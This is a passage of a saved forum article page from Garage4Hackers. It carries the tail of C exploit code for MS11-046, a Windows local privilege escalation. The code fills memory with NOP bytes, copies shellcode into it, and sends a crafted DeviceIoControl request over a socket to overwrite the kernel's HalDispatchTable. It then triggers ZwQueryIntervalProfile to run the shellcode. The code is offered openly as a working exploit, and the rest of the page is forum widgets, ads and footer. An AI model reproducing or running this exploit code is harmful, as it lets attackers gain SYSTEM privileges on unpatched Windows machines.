#DD0000">"\n&#91;+&#93;&nbsp;status&nbsp;%p.\n"</span><span style="color: #007700">,</span><span style="color: #0000BB">alloc_status&nbsp;</span><span style="color: #007700">);<br /><br />&nbsp;if(&nbsp;</span><span style="color: #0000BB">alloc_status&nbsp;</span><span style="color: #007700">!=&nbsp;</span><span style="color: #0000BB">0&nbsp;</span><span style="color: #007700">)<br />&nbsp;{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"&#91;-&#93;&nbsp;Sh*t&nbsp;happen&nbsp;with&nbsp;NtAllocateVirtualMemory()&nbsp;,&nbsp;%#X\n"</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">alloc_status</span><span style="color: #007700">);<br /><br />&nbsp;}<br /><br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\t\tZwAllocateVirtualMemory()&nbsp;Allocated&nbsp;return&nbsp;Status,&nbsp;%#X\n"</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">alloc_status</span><span style="color: #007700">);<br />&nbsp;</span><span style="color: #0000BB">memset</span><span style="color: #007700">(</span><span style="color: #0000BB">hexcode_addr</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">0x90</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">sizeofshell</span><span style="color: #007700">);<br /><br />&nbsp;</span><span style="color: #0000BB">memcpy</span><span style="color: #007700">(&nbsp;(</span><span style="color: #0000BB">void</span><span style="color: #007700">*)((</span><span style="color: #0000BB">BYTE</span><span style="color: #007700">*)</span><span style="color: #0000BB">hexcode_addr&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">0x100</span><span style="color: #007700">),(</span><span style="color: #0000BB">void</span><span style="color: #007700">*)</span><span style="color: #0000BB">hexcode</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">hexcode</span><span style="color: #007700">));<br /><br /></span><span style="color: #0000BB">iResult&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">WSAStartup</span><span style="color: #007700">(</span><span style="color: #0000BB">MAKEWORD</span><span style="color: #007700">(</span><span style="color: #0000BB">2</span><span style="color: #007700">,</span><span style="color: #0000BB">2</span><span style="color: #007700">),&nbsp;&amp;</span><span style="color: #0000BB">wsaData</span><span style="color: #007700">);<br />if&nbsp;(</span><span style="color: #0000BB">iResult&nbsp;</span><span style="color: #007700">!=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"WASUP&nbsp;Failed:&nbsp;%d\n"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">iResult</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #0000BB">iResult&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">getaddrinfo</span><span style="color: #007700">(</span><span style="color: #0000BB">DEFAULT_ADDR</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">DEFAULT_PORT</span><span style="color: #007700">,&nbsp;&amp;</span><span style="color: #0000BB">hints</span><span style="color: #007700">,&nbsp;&amp;</span><span style="color: #0000BB">result</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #0000BB">ptr</span><span style="color: #007700">=</span><span style="color: #0000BB">result</span><span style="color: #007700">;<br /><br /></span><span style="color: #FF8000">//&nbsp;SOCKET&nbsp;for&nbsp;connecting&nbsp;to&nbsp;localhost&nbsp;at&nbsp;135<br /><br /></span><span style="color: #0000BB">ConnectSocket&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">socket</span><span style="color: #007700">(</span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_family</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_socktype</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_protocol</span><span style="color: #007700">);<br />if&nbsp;(</span><span style="color: #0000BB">ConnectSocket&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">INVALID_SOCKET</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"&#91;-&#93;&nbsp;This&nbsp;is&nbsp;bad&nbsp;,&nbsp;Socket&nbsp;Error&nbsp;:&nbsp;%ld\n"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">WSAGetLastError</span><span style="color: #007700">());<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">freeaddrinfo</span><span style="color: #007700">(</span><span style="color: #0000BB">result</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">WSACleanup</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />}<br /><br /></span><span style="color: #FF8000">//&nbsp;Connect&nbsp;to&nbsp;server.<br /></span><span style="color: #0000BB">iResult&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">connect</span><span style="color: #007700">(&nbsp;</span><span style="color: #0000BB">ConnectSocket</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_addr</span><span style="color: #007700">,&nbsp;(int)</span><span style="color: #0000BB">ptr</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">ai_addrlen</span><span style="color: #007700">);<br />if&nbsp;(</span><span style="color: #0000BB">iResult&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">SOCKET_ERROR</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">closesocket</span><span style="color: #007700">(</span><span style="color: #0000BB">ConnectSocket</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ConnectSocket&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">INVALID_SOCKET</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"&#91;+&#93;Unable&nbsp;to&nbsp;connect&nbsp;to&nbsp;server,&nbsp;modify&nbsp;code&nbsp;and&nbsp;add&nbsp;a&nbsp;server&nbsp;socket,&nbsp;and&nbsp;connect&nbsp;to&nbsp;it!\n"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">WSACleanup</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;;<br />}<br /><br />else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"&#91;+&#93;Hola&nbsp;Connected&nbsp;to&nbsp;server&nbsp;!\n"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br /><br /><br /></span><span style="color: #0000BB">memset</span><span style="color: #007700">(</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">,</span><span style="color: #0000BB">0x90</span><span style="color: #007700">,</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">));<br /></span><span style="color: #0000BB">memset</span><span style="color: #007700">(</span><span style="color: #0000BB">obuf</span><span style="color: #007700">,</span><span style="color: #0000BB">0x90</span><span style="color: #007700">,</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">obuf</span><span style="color: #007700">));<br /><br /></span><span style="color: #0000BB">DeviceIoControl</span><span style="color: #007700">((</span><span style="color: #0000BB">HANDLE</span><span style="color: #007700">)</span><span style="color: #0000BB">ConnectSocket</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">0x12007</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">,</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">obuf</span><span style="color: #007700">,</span><span style="color: #0000BB">0</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;</span><span style="color: #0000BB">Ret_size</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">NULL</span><span style="color: #007700">);<br /><br /><br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n\n&#91;+&#93;&nbsp;Overwriting&nbsp;HalDispatchTable&nbsp;...."</span><span style="color: #007700">);<br /><br />&nbsp;</span><span style="color: #0000BB">DeviceIoControl</span><span style="color: #007700">((</span><span style="color: #0000BB">HANDLE</span><span style="color: #007700">)</span><span style="color: #0000BB">ConnectSocket</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">0x12007</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">,</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(</span><span style="color: #0000BB">ibuf</span><span style="color: #007700">),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">HalDispatchTable</span><span style="color: #007700">,</span><span style="color: #0000BB">0</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;</span><span style="color: #0000BB">Ret_size</span><span style="color: #007700">,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">NULL</span><span style="color: #007700">);<br /><br /><br /><br />&nbsp;</span><span style="color: #0000BB">printf</span><span style="color: #007700">(</span><span style="color: #DD0000">"\n\n&#91;+&#93;&nbsp;This&nbsp;should&nbsp;work&nbsp;and&nbsp;break..."</span><span style="color: #007700">);<br /><br />&nbsp;</span><span style="color: #0000BB">ZwQueryIntervalProfile</span><span style="color: #007700">(</span><span style="color: #0000BB">stProfile</span><span style="color: #007700">,&amp;</span><span style="color: #0000BB">result</span><span style="color: #007700">);<br /><br /><br /><br /><br />}&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div></div>

	

	
		<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
		<script type="text/javascript">
		<!--
		vBulletin.register_control("vB_Lightbox_Container", "article_content", 1);
		//-->
		</script>
	

	

	
		<sub class="article_promoted_text">
			This article was originally published in blog:
			<a href="bloge81f.html?u=8">MS11-046 exploit Code, Windows local Privilege Escalation .</a>
			started by
			<a href="membere81f.html?u=8">fb1h2s</a>
		</sub>
	
	<div class="cmslinks">

		
	
		<div>
			<div id="articletagcontainer_113">
				Tags: 
		
			<a href="tagsa85f.html?tag=ms11-046">ms11-046</a>, 
		
			<a href="tags7dc3.html?tag=ms11-046+exploit">ms11-046 exploit</a>
		

<img src="images/misc/11x11progress.html" id="tag_form_progress" class="inlineimg hidden" alt="" />
			</div>
		</div>
	
	</div>

    
	<script type="text/javascript">
	var THREADID = 2174;
	var THIS_URL = "contentb0dd.html?r=118-MS11-046-exploit-Code-Windows-local-Privilege-Escalation";
	var MIN_CHARS = 30;
	vbphrase['comment'] = "Comment";
	vbphrase['comments'] = "Comments";
</script>
<div id="comments" class="cms_comments_page">
	<a name="comments_start"></a>
	
	<script type="text/javascript" src="clientscript/vbulletin-editor6719.html?v=421"></script>
	<script type="text/javascript" src="clientscript/vbulletin_quick_edit6719.html?v=421"></script>
	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
	<div id="node_comments_hide"></div>
	<!-- EDITOR IS BREAKING THE PAGE -->
	
</div>


</div></li>
</ul>
					</div>
				</div>
			</div>
		</div>
		<div class="yui-b yui-sidebar">
			<ul class="list_no_decoration widget_list" id="widgetlist_column3">
<li><div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
		<h3><img src="images/site_icons/html.html" alt="" /> G4H Facebook</h3>
		</div>
		<div class="cms_widget_content widget_content">
		<div class="fb-like-box" data-href="https://www.facebook.com/pages/Garage4Hackers/138904662794635" data-width="300" data-height="250" data-colorscheme="light" data-show-faces="true" data-header="true" data-stream="false" data-show-border="true"></div>
		</div>
	</div>
</div></li><li><div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
		<h3><img src="images/site_icons/html.html" alt="" /> G4H Twitter</h3>
		</div>
		<div class="cms_widget_content widget_content">
		<a class="twitter-timeline"  href="../external.html?link=https://twitter.com/garage4hackers"  data-widget-id="387207513831010305">Tweets by @garage4hackers</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
		</div>
	</div>
</div></li>
</ul>
		</div>
	</div>
</div>

</div>

<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script type="text/javascript"
  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script></div>
</div>

<div id="footer" class="floatcontainer footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label="&nbsp;Standard Styles">
									
					
	<option value="1" class="" selected="selected">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label="&nbsp;Mobile Styles">
					
					
	<option value="2" class="" >-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul id="footer_links" class="footer_links">
		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="contentb0dd.html?r=118-MS11-046-exploit-Code-Windows-local-Privilege-Escalation#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">03:54 PM</span>.</div>

<div id="footer_copyright" class="shade footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div id="footer_morecopyright" class="shade footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	<img src="cron70ea.gif?rand=1584872665" alt="" width="1" height="1" border="0" />
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>
</body>
</html>